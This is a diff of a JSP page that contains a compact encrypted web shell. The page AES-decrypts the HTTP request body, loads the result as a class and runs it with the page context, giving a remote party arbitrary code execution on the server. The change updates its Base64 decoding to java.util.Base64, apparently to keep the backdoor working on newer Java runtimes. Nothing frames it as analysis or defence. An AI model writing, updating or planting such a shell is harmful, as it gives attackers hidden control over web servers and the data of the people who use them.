@@ -1,4 +1,5 @@
 <%@page import="javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec"%>
+<%@ page import="java.io.IOException" %>
 <%!class U extends ClassLoader{
     U(ClassLoader c){
         super(c);
@@ -13,6 +14,6 @@
         session.putValue("u",k);
         Cipher c=Cipher.getInstance("AES");
         c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
-        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
+        new U(this.getClass().getClassLoader()).g(c.doFinal(java.util.Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);
     }
 %>
